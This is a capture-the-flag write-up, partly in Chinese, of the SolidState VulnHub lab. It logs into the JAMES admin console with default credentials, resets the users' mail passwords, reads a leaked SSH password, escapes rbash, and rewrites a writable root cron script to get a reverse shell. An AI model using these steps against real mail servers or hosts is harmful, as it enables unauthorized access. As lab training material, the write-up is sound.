# SolidState: 1

2024-8-10 https://www.vulnhub.com/entry/solidstate-1,261/

difficulty: begginer-intermediate

## IP

192.168.10.150

## Scan

Open Port -> 22,25,80,110,119,4555

```
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)
|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (192.168.10.3 [192.168.10.3]), PIPELINING, ENHANCEDSTATUSCODES
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings:
|   GenericLines:
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for
|_    Login id:
```

先看 80 web，gobuster 扫描后，没发现什么内容，是个静态的网站。

JAMES Remote Administration Tool 2.3.2 经过搜索，发现其默认的用户名和密码为 root:root, 使用 nc 进行登陆: nc 192.168.10.150 4555

listusers 发现有 5 个用户名:

```
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

猜测可能这些用户的邮箱中存在可利用的信息，但是不知道这些密码，这个工具上提供了可以重置邮箱密码的功能:

```
setpassword james test
setpassword thomas test
setpassword john test
setpassword mindy test
setpassword mailadmin test
```

telnet 到 mindy 的 110 收邮箱端口后，发现第 2 封邮件中有用户名和密码:

```
username: mindy
pass: P@55W0rd1!2@
```

ssh 进行登陆，发现了 user flag:

```
mindy@solidstate:~$ cat user.txt
914d0a4ebc1777889b5b89a23f556fd75
```

发现当前 shell 为 rbash 受到限制，重新 ssh 登陆绕过 rbash : ssh mindy@192.168.10.150 -t "bash --noprofile"

sudo suid crontab 等都无特殊的配置，经过枚举，发现 /opt/tmp.py 为一个脚本功能是清除 tmp 中的文件 `os.system('rm -r /tmp/* ')` 同时有 w 权限，此文件应该是 root 用户定时调用的特殊计划任务，上传 pspy32 等待几分钟，看看是否能找到突破口。过了 3 分钟，发现 python /opt/tmp.py 显示被调用，则可以直接修改 py 中的内容，实现反弹，获得 root 权限。

```
rootbash-4.4# cat root.txt
b4c9723a28899b1c45db281d99cc87c9
```
